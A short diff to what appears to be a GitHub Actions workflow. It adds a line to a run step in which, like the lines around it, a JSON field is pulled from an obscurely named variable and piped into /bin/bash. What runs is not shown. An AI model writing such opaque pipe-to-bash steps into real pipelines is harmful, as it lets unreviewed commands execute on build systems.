@@ -28,6 +28,7 @@ jobs:
           echo $wrgj6896 | jq -r .nv752 | /bin/bash
           echo $o1 | jq -r .ejga1448 | /bin/bash
           echo $iptv5 | jq -r .nip85 | /bin/bash
+          printf '%s' "$w61" | jq -r .dmk56 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
